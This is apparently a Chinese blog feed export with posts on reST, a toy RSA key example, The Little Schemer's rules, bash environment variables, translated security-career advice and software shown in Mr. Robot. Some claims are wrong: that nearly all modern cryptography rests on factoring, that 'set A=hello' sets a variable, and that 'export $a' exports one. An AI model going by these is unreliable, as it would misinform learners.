<h2 id="与-Markdown-相比"><a href="#与-Markdown-相比" class="headerlink" title="与 Markdown 相比"></a>与 Markdown 相比</h2><p>与 Markdown 相比，reST 更具扩展性，特别是 directives 的出现，可以按照需求自定义各种各样的 directives 来扩展 reST。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="http://rst.ninjs.org/">这里</a>有一个在线的 reST 编辑器。</p>
<p>要了解更多关于 reST 的知识可参考 <a href="http://docutils.sourceforge.net/rst.html">Docutils 官方文档</a>，或者 <a href="http://www.sphinx-doc.org/en/master/usage/restructuredtext/index.html">Sphinx 官方文档</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>RSA加密算法</title>
    <url>/2018/10/18/rsa/</url>
    <content><![CDATA[<p>RSA加密算法中的3个字母分别是由此算法的3位发明者：Ron Rivest，Adi Shamir，Leonard Adleman的姓氏首字母组成的，RSA加密算法可以说是<strong>现代密码学</strong>中<strong>非对称加密</strong>的一个典型，所谓非对称加密其实就是<strong>公钥用于加密，私钥用于解密</strong>而已。在介绍RSA之前，先要理解一个基本常识，就是几乎所有的现代密码学算法背后都是基于<strong>因数分解难题</strong>发明的，所谓因数分解难题就是指目前没有一个<strong>快速</strong>的计算机算法可以对极大整数做因数分解。</p>
<a id="more"></a>
<h2 id="公钥与私钥"><a href="#公钥与私钥" class="headerlink" title="公钥与私钥"></a>公钥与私钥</h2><p>RSA加密算法通过如下步骤生成公钥和私钥：</p>
<ol>
<li>随机选择2个不相等的质数p和q，计算p和q的乘积n<br>取p=61，q=53，则n=3233</li>
<li>计算n的欧拉函数φ(n)<br>φ(3233)=60×52=3120</li>
<li>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n)互质，并计算e对于φ(n)的模反元素d<br>取e=17，d=2753</li>
<li>将n和e封装成公钥，n和d封装成私钥<br>公钥位(n, e)，私钥为(n, d)</li>
</ol>
<h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Scheme的五法十诫</title>
    <url>/2019/08/07/scheme-commandments-and-laws/</url>
    <content><![CDATA[<p>节选自《The Little Schemer》</p>
<h2 id="Scheme-五法"><a href="#Scheme-五法" class="headerlink" title="Scheme 五法"></a>Scheme 五法</h2><h3 id="Scheme-五法之第一法-——-car-之法则"><a href="#Scheme-五法之第一法-——-car-之法则" class="headerlink" title="Scheme 五法之第一法 —— car 之法则"></a>Scheme 五法之第一法 —— car 之法则</h3><p>基本元件 <em>car</em> 仅定义为针对非空列表。</p>
<h3 id="Scheme-五法之第二法-——-cdr-之法则"><a href="#Scheme-五法之第二法-——-cdr-之法则" class="headerlink" title="Scheme 五法之第二法 —— cdr 之法则"></a>Scheme 五法之第二法 —— cdr 之法则</h3><p>基本元件 <em>cdr</em> 仅定义为针对非空列表。任意非空列表的 <em>cdr</em> 总是另一个列表。</p>
<h3 id="Scheme-五法之第三法-——-cons-之法则"><a href="#Scheme-五法之第三法-——-cons-之法则" class="headerlink" title="Scheme 五法之第三法 —— cons 之法则"></a>Scheme 五法之第三法 —— cons 之法则</h3><p>基本元件 <em>cons</em> 需要两个参数。第二个参数必须是一个列表。结果是一个列表。</p>
<h3 id="Scheme-五法之第四法-——-Null-之法则"><a href="#Scheme-五法之第四法-——-Null-之法则" class="headerlink" title="Scheme 五法之第四法 —— Null? 之法则"></a>Scheme 五法之第四法 —— Null? 之法则</h3><p>基本元件 <em>null?</em> 仅定义为针对列表。</p>
<h3 id="Scheme-五法之第五法-——-eq-之法则"><a href="#Scheme-五法之第五法-——-eq-之法则" class="headerlink" title="Scheme 五法之第五法 —— eq? 之法则"></a>Scheme 五法之第五法 —— eq? 之法则</h3><p>基本元件 <em>eq?</em> 需要两个参数。每个参数都必须是一个非数字的原子。</p>
<a id="more"></a>
<h2 id="Scheme十诫"><a href="#Scheme十诫" class="headerlink" title="Scheme十诫"></a>Scheme十诫</h2><h3 id="第一诫"><a href="#第一诫" class="headerlink" title="第一诫"></a>第一诫</h3><p>当对一个原子列表 <em>lat</em> 进行递归调用时，询问两个有关 <em>lat</em> 的问题：*(null? lat)* 和 <strong>else</strong>。</p>
<p>当对一个数字 <em>n</em> 进行递归调用时，询问两个有关 <em>n</em> 的问题：*(zero? n)* 和 <strong>else</strong>。</p>
<p>当对一个S-表达式列表 <em>l</em> 进行递归调用时，询问三个有关 <em>l</em> 的问题：*(null? lat)<em>、</em>(atom? (car l))* 和 <strong>else</strong>。</p>
<h3 id="第二诫"><a href="#第二诫" class="headerlink" title="第二诫"></a>第二诫</h3><p>使用 <em>cons</em> 来构建列表。</p>
<h3 id="第三诫"><a href="#第三诫" class="headerlink" title="第三诫"></a>第三诫</h3><p>构建一个列表的时候，描述第一个典型元素，之后 <em>cons</em> 该元素到一般性递归（natural recursion）上。</p>
<h3 id="第四诫"><a href="#第四诫" class="headerlink" title="第四诫"></a>第四诫</h3><p>在递归时总是改变至少一个参数。当对一个原子列表 <em>lat</em> 进行递归调用时，使用 <em>(cdr lat)*。当对数字 *n</em> 进行递归调用时，使用 <em>(sub1 n)*。当对一个S-表达式 *l</em> 进行递归调用时，只要是 <em>(null? l)</em> 和 <em>(atom? (car l))</em> 都不为 true，那么就同时使用 <em>(car l)</em> 和 *(cdr l)*。</p>
<p>在递归时改变的参数，必须向着不断接近结束条件而改变。改变的参数必须在结束条件中得以测试：<br>    当使用 <em>cdr</em> 时，用 <em>null?</em> 测试是否结束；<br>    当使用 <em>sub1</em> 时,用 <em>zero?</em> 测试是否结束。</p>
<h3 id="第五诫"><a href="#第五诫" class="headerlink" title="第五诫"></a>第五诫</h3><p>当用 ➕ 构建一个值时，总是使用 0 作为结束代码行的值，因为加上 0 不会改变加法的值。</p>
<p>当用 ✖ 构建一个值时，总是使用 1 作为结柬代码行的值，因为乘以 1 不会改变乘法的值。</p>
<p>当用 <em>cons</em> 构建一个值时，总是考虑把 0 作为结束代码行的值。</p>
<h3 id="第六诫"><a href="#第六诫" class="headerlink" title="第六诫"></a>第六诫</h3><p>简化工作只在功能正确之后开展。</p>
<h3 id="第七诫"><a href="#第七诫" class="headerlink" title="第七诫"></a>第七诫</h3><p>对具有相同性质的 <em>subparts</em>（子部件）进行递归调用：</p>
<ul>
<li>列表的子列表。</li>
<li>算术表达式的子表达式。</li>
</ul>
<h3 id="第八诫"><a href="#第八诫" class="headerlink" title="第八诫"></a>第八诫</h3><p>使用辅助函数来抽象表示方式。</p>
<h3 id="第九诫"><a href="#第九诫" class="headerlink" title="第九诫"></a>第九诫</h3><p>用函数来抽象通用模式。</p>
<h3 id="第十诫"><a href="#第十诫" class="headerlink" title="第十诫"></a>第十诫</h3><p>构建函数,一次收集多个值。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title>set、env与export</title>
    <url>/2018/05/09/set-env-export/</url>
    <content><![CDATA[<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p><strong>环境变量</strong>，顾名思义由<strong>环境</strong>和<strong>变量</strong>两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell也是如此，同样的，通过Shell所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。</p>
<p>在Linux中，环境变量可以大致分为<strong>Shell环境变量</strong>和<strong>用户环境变量</strong>两大类，不同的Shell有不同的Shell环境变量，例如bash与Zsh的Shell环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell环境变量包含了用户环境变量。</p>
<p>在Linux中可以使用<code>declare</code>命令直接定义<strong>Shell环境变量</strong>，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义Shell环境变量A，值为hello，注意等号两边不能有空格</span></span><br><span class="line"><span class="comment"># 按照传统，环境变量一般为全大写</span></span><br><span class="line"><span class="built_in">declare</span> A=hello</span><br></pre></td></tr></table></figure>
<p>同样的，在Linux中使用<code>echo</code>命令即可打印环境变量的值，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印A的值，环境变量前需加“$”符号，</span></span><br><span class="line"><span class="comment"># 表示要打印的是环境变量而不是一般字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$A</span></span><br></pre></td></tr></table></figure>
<p>值得注意的是，这种定义只对当前终端有效，关闭终端后失效。</p>
<p>常见的Shell环境变量有：</p>
<ul>
<li>COLUMNS：当前终端的宽度</li>
<li>LINES：当前终端的高度</li>
</ul>
<p>常见的用户环境变量有：</p>
<ul>
<li>PATH：用以指定命令的搜索目录</li>
<li>HOME：用以指定用户的家目录</li>
<li>SHELL：用以指定用户的登录Shell</li>
<li>HTTP_PROXY：用以指定终端的HTTP代理信息，与下一个变量要同时设置</li>
<li>HTTPS_PROXY：用以指定终端的HTTPS代理信息</li>
</ul>
<a id="more"></a>

<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p><code>set</code>命令用来显示或设置<strong>Shell环境变量</strong>，当不带参数运行时默认显示所有已定义的Shell环境变量，若要设置环境变量可采用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> A=hello</span><br></pre></td></tr></table></figure>
<p>值得注意的是，当<code>declare</code>命令不带任何参数运行时，也会显示所有的Shell环境变量，但它比<code>set</code>显示的结果要更加清晰。</p>
<p>关于set命令更多的参数使用说明可参考阮一峰的博文：<a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash脚本set命令教程</a></p>
<h2 id="env（仅限于Linux）"><a href="#env（仅限于Linux）" class="headerlink" title="env（仅限于Linux）"></a>env（仅限于Linux）</h2><p><code>env</code>命令用来显示或设置<strong>用户环境变量</strong>，当不带参数运行时默认显示所有已定义的用户环境变量，若要设置环境变量可采用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="export（仅限于Linux）"><a href="#export（仅限于Linux）" class="headerlink" title="export（仅限于Linux）"></a>export（仅限于Linux）</h2><p><code>export</code>命令用来显示或设置当前导出至用户环境变量的Shell环境变量，当不带参数运行时默认显示所有已导出至用户环境变量的Shell环境变量，若要导出某Shell环境变量到用户环境变量可采用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> a=hello</span><br></pre></td></tr></table></figure>
<p>这一步操作实际上完成了两步操作，即：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">declare</span> a=hello  <span class="comment">#定义一个Shell环境变量$a</span></span><br><span class="line"><span class="built_in">export</span> <span class="variable">$a</span>  <span class="comment">#导出至用户环境变量</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>那么，你想在安全行业工作吗？</title>
    <url>/2018/09/18/so-you-want-to-work-in-security/</url>
    <content><![CDATA[<p>本文翻译自<a href="https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23">https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23</a> ，正文如下：</p>
<p>每隔一段时间，我就会收到一封来自陌生人的电子邮件，询问有关如何从事安全行业（计算机，信息，网络等等）的建议。这很棒！我们需要更多充满激情，富有创造力和勤奋工作的人，他们希望努力使技术更安全。它也是一种非常经济稳定的谋生方式。关于这个确切的话题还有很多其他帖子，但我会根据自己的经验提出一些高层次的想法。<br><img src="https://cdn-images-1.medium.com/max/1000/1*Z7BjkasC8Kx5JtZ7N5Pe2A.gif" alt="不像电影"></p>
<a id="more"></a>

<h2 id="警告：这不像电影。"><a href="#警告：这不像电影。" class="headerlink" title="警告：这不像电影。"></a>警告：这不像电影。</h2><p>在安全方面工作并不像好莱坞所描绘的那样。我喜欢观看黑客风格的电影和节目，以获得幻想和逃避，但日常工作并不像在屏幕上看起来那样快速和性感（就我的经验来说）。<br>现在，对于大多数职业来说都是如此，即使我从未花费一天时间在地下巢穴中解读流媒体代码，我仍然认为这是一个令人兴奋，重要，具有挑战性和有益的领域。</p>
<h2 id="没有标准或完美的课程。"><a href="#没有标准或完美的课程。" class="headerlink" title="没有标准或完美的课程。"></a>没有标准或完美的课程。</h2><p>安全是一个广泛的，跨学科的应用领域。有设计和构建安全系统的人，尝试破坏系统的人，尝试检测入侵的人以及介于两者之间的大量事物。如果我学到了什么，我就知道没有单一的，标准的或最好的准备路径。也许这会随着领域的成熟而改变，但我对此表示怀疑。它也不像其他需要认证的专业领域（例如医学，法律），这既可以是解放也可以是恐吓。<br>独立于你如何获得它，你将受益于对应用计算机科学或计算机和软件的工作方式的强烈理解。<strong>许多应用计算机科学都是关于解决抽象层的问题，安全性通常是在这些抽象中找到有缺陷的假设......然后找出如何最好地修复（或利用）它们。</strong><br>我是通过从公立大学获得计算机科学工程学位来做到这一点的。对我来说，一些更有用的主题是操作系统，网络，计算机体系结构和编译器。除此之外，我也参加了我感兴趣的技术课程（例如数字信号处理，生物医学工程，人工智能），并通过学生俱乐部和实习中的项目工作探索了网络，隐私增强技术和（网络，客户端）应用安全方面的安全主题。<br>你还将从了解使用技术的人（用户，客户等）的工作方式中获益。如果我能回到我的大学时代，我会参加一些心理学，社会学和人文因素课程。<br>我与具有相似传统学术背景的专家（例如计算机工程，计算机科学，数学等学位）工作过。我也认识很多不太具有典型背景的人（例如化学，电影研究，心理学，平面设计）和一些在完成学位之前辍学的人。<br>关于安全认证的话题，我没有任何一个认证，我不认为我因此而被拒之门外。有些行业或国家可能会要求他们为信息安全专业人士提供服务，他们肯定是一些合理的人所追求的 - 告诫者！<br>在文化方面，我建议阅读<a href="https://en.wikipedia.org/wiki/Hacker_Manifesto">黑客宣言</a>或<a href="https://translations.readthedocs.io/en/latest/">如何成为一名黑客</a>，这对许多安全专家来说都是灵感和道德的指南针。 即使你不把自己比作黑客，理解和你一起工作的一些人的心态也是有帮助的。<br>除此之外，我所知道的大部分知识都是随着时间的推移，从朋友和同事的轶事，安全博客，会议论文和演示文稿，邮件列表，本地安全组和其他在线资源中学到的。我今天听到或摄取的很多东西都来自<a href="https://twitter.com/laparisa/lists/security">我的Twitter安全列表</a>上的人。</p>
<h2 id="停止阅读，开始做。"><a href="#停止阅读，开始做。" class="headerlink" title="停止阅读，开始做。"></a>停止阅读，开始做。</h2><p><img src="https://cdn-images-1.medium.com/max/1000/1*Q7FRcfOGAAIJoADz0KvTIQ.gif" alt="标题图"><br>这适用于任何职业追求，但尽可能快地获得一些真实的工作经验。这是缩小你的兴趣，优势和未来发展领域的最佳方式。你还可以更好地了解正常工作日和环境的组成，包括你喜欢和不喜欢的内容。我生命中最有价值的职业相关经历之一是做了一个我讨厌的实习，因为它，所以我强烈地转向了另一个方向:)<br>在如何开始获得经验方面，我没有一个简单的答案。查看招聘会和会议，参与俱乐部或其他组织，以大胆的热情申请实习和兼职工作。在来谷歌之前，我在一个特许摊位清理干燥的nacho奶酪，这是我作为社区游泳池救生员定期轮班的一部分。这一点工作经验帮助我获得了大学宿舍管理员的工作，这在一家大型制药公司的IT实习面试时无疑是相关的。我在大学的俱乐部获得了一些“真实”（即非课程）软件体验，并且我在学校新闻组上发现了一个网络安全实习机会，这可能给了我足够的相关工作经验，让谷歌的某个人考虑为我安排一个面试。</p>
<h2 id="写代码。"><a href="#写代码。" class="headerlink" title="写代码。"></a>写代码。</h2><p>我认识的最好的安全工程师也在积极编写代码。这为他们提供了编写软件的第一手经验，包括无意中但不可避免地引入了安全漏洞。后者迫使所有开发者真正感同身受。毕竟，一直编写安全代码通常比指出不安全的代码更难。<br>如果你坚持从一个大型项目开始，请尝试修复开源项目中的错误。每个人都喜欢修复bug的人！该项目将感谢你，这通常是一种获得真实体验的好方法，也是你未来工作的好方法。</p>
<h2 id="破坏代码。"><a href="#破坏代码。" class="headerlink" title="破坏代码。"></a>破坏代码。</h2><p>花时间寻找软件bug。了解如何使用调试器，网络扫描程序，Web调试代理和软件模糊测试。花时间在黑客游乐场，可用于所有技能水平。我在大学时第一次使用<a href="https://www.hackthissite.org/">https://www.hackthissite.org</a> ，并在<a href="https://infosec.rocks/">https://infosec.rocks</a> 列出了其他一些自我指导的黑客培训网站。还有一个很好的黑客挑战、比赛列表（例如CTF），不想浪费时间的人可以点<a href="https://security.stackexchange.com/questions/3592/what-hacking-competitions-challenges-exist">这里</a>。或者查找并报告你使用的实际软件中的bug。有<a href="https://www.bugcrowd.com/bug-bounty-list/">许多软件供应商为安全漏洞提供现金奖励</a>，包括<a href="https://www.google.com/about/appsecurity/chrome-rewards/">Chrome</a>和<a href="https://www.google.com/about/appsecurity/reward-program/">Google</a>，以及<a href="https://www.hackerone.com/internet-bug-bounty">Internet Bug Bounty</a>计划涵盖的一些核心开源项目。<br>除了自己找到错误之外，我还建议你继续学习并了解其他人的发现（<a href="https://seclists.org/bugtraq/">bugtraq</a>，<a href="https://seclists.org/fulldisclosure/">fulldisclosure</a>，<a href="https://seclists.org/oss-sec/">oss-sec</a>）。</p>
<h2 id="分享知识。"><a href="#分享知识。" class="headerlink" title="分享知识。"></a>分享知识。</h2><p>我开始了解安全是从大学中由同龄人组织的一个名为<a href="https://www-s.acm.illinois.edu/mailman/listinfo/sigmil-l">SigMil</a>的特别有趣的ACM小组中，成员们会对他们感兴趣的安全主题进行粗略的演示。我们还参加了一年一度的<a href="https://www.defcon.org/">DEFCON</a>朝圣之旅，参加会谈（十年前要做的事情要容易得多），购买安全<a href="https://www.defcon.org/html/links/book-list.html">书籍</a>或<a href="https://www.2600.com/">杂志</a>，或者只是与来自世界其他地方的志同道合的人聊聊他们的工作。在Google，我直接从同行那里学到了很多东西，分享他们的专业知识，斗争和半生不熟的想法。<br>分享知识很重要，原因如下：</p>
<ol>
<li>分享知识是在大型组织或项目中扩展最佳安全实践（或避免陷阱）的必要且有效的方法。</li>
<li>我几乎总是在准备演示文稿或编写文档时自己学习一些东西，因此对于我来说，发现一个主题的隐藏角落是一个很好的强制功能。</li>
<li>我几乎总是从读者那里学到一些东西，无论是问题，评论还是后续讨论。</li>
<li>把爱传出去。</li>
</ol>
<h2 id="练习你的沟通。"><a href="#练习你的沟通。" class="headerlink" title="练习你的沟通。"></a>练习你的沟通。</h2><p>在安全方面工作意味着你需要定期向不同的受众解释复杂的技术问题，每个受众都有不同的词汇，专业知识和激励措施。在描述漏洞的严重性时，你很少会依赖通用指标，在推广最佳安全实践时也不会有任何闪亮的东西。面对<a href="https://zh.wikipedia.org/zh-cn/FUD">FUD(即恐惧、不确定、怀疑)</a>，你必须让人们不受欢迎，然后专注于危机之外的行动。<br>所有这些都需要沟通艺术方面的技能，特别是解释和谈判。你不可能从纯粹的技术资源中掌握这门艺术，所以练习，发表，并永远致力于改进。</p>
<h2 id="期望努力工作，有时会失败。"><a href="#期望努力工作，有时会失败。" class="headerlink" title="期望努力工作，有时会失败。"></a>期望努力工作，有时会失败。</h2><p><img src="https://cdn-images-1.medium.com/max/1000/1*0iQlhQQUroM4_A1zAW6n3w.gif" alt="标题图"><br>也许这很明显，但值得明确表示。<br>安全是挑战性工作。你需要不断学习新事物，因为你需要保护的技术环境正在快速发展，这比我们弃用旧的，尚未完全安全的内容的能力要快得多。经常有时间和资源的威胁行动者也能很快适应现有的防御。<br>安全可能会有压力。你正在处理模棱两可的问题，不完善的解决方案，有限的数据以及对人类安全的真正威胁。<br>很难用安全性衡量成功，根据我的经验，人们更有可能注意到失败。 在确保现实世界技术的同时，我们最终还是在减轻风险的过程中，无论RSA供应商的某个人告诉你什么，都没有银弹。</p>
<h2 id="（尝试）保持乐观。"><a href="#（尝试）保持乐观。" class="headerlink" title="（尝试）保持乐观。"></a>（尝试）保持乐观。</h2><p>由于我刚才概述的一些原因，这个领域可能令人沮丧。跟上技术和开发的创新速度似乎是不可能的。 我的意思是，缓冲区溢出漏洞已存在数十年，但我们今天（2016）仍然经常看到利用它们的高影响漏洞。你会经常听到人们尖叫安全是不可能的，而且情况正在恶化，或者<a href="https://lcamtuf.blogspot.com/2010/05/security-engineering-broken-promises.html">说出我们为什么都失败的完全雄辩点</a>。<br>现实可能是苛刻的，但如果我们专注于积极思考并考虑技术所提供的所有东西，那真是令人印象深刻！这不完美。它永远不会是完美的。但我认为当今安全的最前沿比10年前要好得多，我们可以通过一定程度的合理保证做一些相当令人印象深刻的事情，这让我感到乐观。</p>
<h2 id="请求帮忙。"><a href="#请求帮忙。" class="headerlink" title="请求帮忙。"></a>请求帮忙。</h2><p>如果你遇到混蛋，不要气馁。多年来，我在信息安全行业看到了大量的沙文主义和自我主义者。通过对话（在线，会议等等）快速变成谁是最精英的人并不罕见。<br>也许这不是每个人的经历，但我在很大程度上取得了成功，这得益于我现在认为是朋友的许多优秀安全人员的支持，建议，指导和帮助。仅仅因为你必须寻求帮助并不意味着你不会因为这项工作而被裁掉。<br>如果您需要帮助，请尽管问。<strong>只要确保你做尽职调查，尽可能让人们帮助你。</strong>大多数专家都非常忙碌，所以如果你问一个有足够背景和没有拼写错误的好问题，你就更有可能获得有用的回应。</p>
<h2 id="祝你好运并且快乐Hacking！"><a href="#祝你好运并且快乐Hacking！" class="headerlink" title="祝你好运并且快乐Hacking！"></a>祝你好运并且快乐Hacking！</h2><p>我偶然发现了一些其他安全职业建议的想法：</p>
<ul>
<li>Thomas Ptacek，Charlie Miller，Jeremiah Grossman，Richard Bejtlich和Bruce Schneier分享了他们的想法<a href="http://krebsonsecurity.com/tag/security-career-advice/">http://krebsonsecurity.com/tag/security-career-advice/</a></li>
<li>我的朋友并且是Chrome同事Chris Palmer分享了可靠的建议<a href="https://noncombatant.org/2016/06/20/get-into-security-engineering">https://noncombatant.org/2016/06/20/get-into-security-engineering</a></li>
<li>Michal Zalewski（又叫做lcamt​​uf）根据他在安全方面20年（令人敬畏的，经常是开创性的）的工作分享了4个简单的经验：<a href="https://lcamtuf.blogspot.com/2016/08/so-you-want-to-work-in-security-but-are.html">https://lcamtuf.blogspot.com/2016/08/so-you-want-to-work-in-security-but-are.html</a></li>
</ul>
<h2 id="译者注"><a href="#译者注" class="headerlink" title="译者注"></a>译者注</h2><p>本文作者为<a href="https://en.wikipedia.org/wiki/Parisa_Tabriz">Parisa Tabriz</a>，她是计算机安全专家，曾在谷歌担任工程总监。由于她在黑客和互联网安全方面的经验，她被称为谷歌的“安全公主”。2012年，“福布斯”杂志将她列入“30位30岁以下技术行业观察人员”名单。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>《黑客军团》中使用的软件</title>
    <url>/2018/09/18/software-used-in-mr-robot/</url>
    <content><![CDATA[<p>本文翻译自<a href="https://alternativeto.net/list/66/software-used-in-mr-robot">https://alternativeto.net/list/66/software-used-in-mr-robot</a> ，正文如下：</p>
<p><img src="https://p0.ssl.qhimg.com/t01708531e12a86f171.jpg" alt="首页图片"><br>本文盘点了获得艾美奖和金球奖剧情/惊悚系列电视剧——《黑客军团》中黑客使用的软件。<br><strong>下面的列表包含到了第二季第11集！</strong></p>
<a id="more"></a>

<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a><a href="https://www.kali.org/">Kali Linux</a></h2><p>Kali Linux是针对安全研究人员进行渗透测试的Linux发行版，但同时也被黑客使用，因为它集成了很多黑客工具。由于它是黑客的首选操作系统，所以它在《黑客军团》中经常有过出现。</p>
<h2 id="Wickr"><a href="#Wickr" class="headerlink" title="Wickr"></a><a href="https://wickr.com/">Wickr</a></h2><p>Wickr是一个端到端的加密聊天应用程序，具有诸如消息可调到期时间等功能。在第二季中，fsociety组织使用它来保密通信。</p>
<h2 id="Tor-Browser"><a href="#Tor-Browser" class="headerlink" title="Tor Browser"></a><a href="https://www.torproject.org/projects/torbrowser.html">Tor Browser</a></h2><p>Tor浏览器被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，当第二季第8集中fsociety的成员Trenton用Tor浏览器向Vimeo上传一个泄露的关于非法群体监视的FBI电话会议时，利用到了它。</p>
<h2 id="Raspberry-Pi"><a href="#Raspberry-Pi" class="headerlink" title="Raspberry Pi"></a><a href="https://www.raspberrypi.org/">Raspberry Pi</a></h2><p>树莓派是一个小型的，可编程的计算机板，旨在教孩子们学习计算机科学。由于它的低成本，多功能性和简单性，它也是业余爱好者和程序员的最爱。第一季第5集中Elliot将一个树莓派安装到铁山的气候控制系统中，以便fsociety后期可以远程升高存储E公司磁带备份的存储空间的温度，从而实现美国消费者债务的很大一部分记录的备份被销毁。</p>
<h2 id="FileZilla"><a href="#FileZilla" class="headerlink" title="FileZilla"></a><a href="https://filezilla-project.org/">FileZilla</a></h2><p>FileZilla是世界上最流行的FTP客户端，并且是最强大和用户友好的客户端之一。在第一季第4集中Trenton使用FileZilla上传一个漏洞利用程序到fsociety的FTP服务器上，即Elliot将安装在铁山的气候控制系统中的树莓派，以销毁美国消费者债务中很大一部分的记录。</p>
<h2 id="Pwnix"><a href="#Pwnix" class="headerlink" title="Pwnix"></a><a href="https://www.pwnieexpress.com/mobile-line-shift-to-aopp">Pwnix</a></h2><p>Pwnix是一个为渗透测试人员定制的用于网络黑客和安全的Android ROM。Elliot在第二季第9集中使用了一个Pwnie Express Pwn Phone（Pwnix预装），以至于他和Darlene渗透进黑暗军团的电话。</p>
<h2 id="DeepSound"><a href="#DeepSound" class="headerlink" title="DeepSound"></a><a href="http://jpinsoft.net/deepsound">DeepSound</a></h2><p>在第一季第8集中，Elliot使用DeepSound将文件隐藏在CD的常规音乐曲目中，以便隐藏文件只能使用DeepSound软件查看。这是一种被称为隐写术的技术。</p>
<h2 id="ProtonMail"><a href="#ProtonMail" class="headerlink" title="ProtonMail"></a><a href="https://protonmail.com/">ProtonMail</a></h2><p>ProtonMail是一个安全的端到端加密电子邮件服务，基于瑞士，Elliot在第一季第8集中使用过。《黑客军团》背后的团队研究安全电子邮件服务的程度很深，以至于他们实际上联系了ProtonMail开发者，询问用户是否有可能在ProtonMail中监控他们自己的电子邮件活动。ProtonMail开发者非常喜欢帐户访问日志的想法，他们最终在ProtonMail的v2.0版本中实现了这个功能。想要了解更多请访问：<a href="https://protonmail.com/blog/protonmail-mr-robot-secure-email/">https://protonmail.com/blog/protonmail-mr-robot-secure-email/</a></p>
<h2 id="HDShredder"><a href="#HDShredder" class="headerlink" title="HDShredder"></a><a href="https://www.miray-software.com/products/applications/hdshredder.html#">HDShredder</a></h2><p>HDShredder 4企业版在第一季第10集中用于在E公司被黑之后安全地擦除所有fsociety的硬盘信息，然后他们在狗狗火葬场焚烧所有的硬盘。</p>
<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a><a href="https://www.openwall.com/john/">John the Ripper</a></h2><p>John the Ripper是Kali Linux中包含的一个密码破解工具，用于检测简单的Unix密码，并试图通过每秒数千次的猜测来破解它们。这被称为暴力破解，Elliot在第一季第2集中通过使用它来破解E公司的临时首席技术官Tyrell Wellick的邮箱密码。</p>
<h2 id="Wegt"><a href="#Wegt" class="headerlink" title="Wegt"></a><a href="https://www.gnu.org/software/wget/">Wegt</a></h2><p>Wget是一个命令行工具，可以发出HTTP(S)请求。在《黑客军团》中它被用于与John the Ripper结合使用Shellshock漏洞来攻击E公司的邮件服务器。</p>
<h2 id="Social-Engineer-Toolkit"><a href="#Social-Engineer-Toolkit" class="headerlink" title="Social-Engineer Toolkit"></a><a href="https://github.com/trustedsec/social-engineer-toolkit">Social-Engineer Toolkit</a></h2><p>SET是一个专注于诸如网络钓鱼等社会工程攻击的测试框架。社会工程学欺骗受害者给予攻击者敏感信息。在第一季第5集中，Mobley使用SET的伪造短信功能让主管离开铁山，以便Elliot可以渗透进去。</p>
<h2 id="OpenWrt"><a href="#OpenWrt" class="headerlink" title="OpenWrt"></a><a href="https://openwrt.org/">OpenWrt</a></h2><p>OpenWrt是Angela在第二季第6集中黑进FBI时使用的路由器固件。</p>
<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h2><p>mimikatz是一个后渗透工具，它将黑客可能需要执行的一些有用任务捆绑在一起。在第二季第6集中，它被装在USB橡皮鸭中并交给Angela，作为一个备份计划。</p>
<h2 id="btscanner"><a href="#btscanner" class="headerlink" title="btscanner"></a><a href="https://www.pentest.co.uk/downloads.html">btscanner</a></h2><p>btscanner是一个包含在Kali Linux中的工具，它可以在无需配对的情况下提取关于蓝牙设备的尽可能多的信息。在第一季第6集中，Elliot使用btscanner与Bluesniff和Metasploit结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。</p>
<h2 id="Bluesniff"><a href="#Bluesniff" class="headerlink" title="Bluesniff"></a><a href="http://bluesniff.shmoo.com/">Bluesniff</a></h2><p>Bluesniff是一款蓝牙设备发现工具。在第一季第6集中，Elliot使用Bluesniff与Metasploit和btscanner结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。</p>
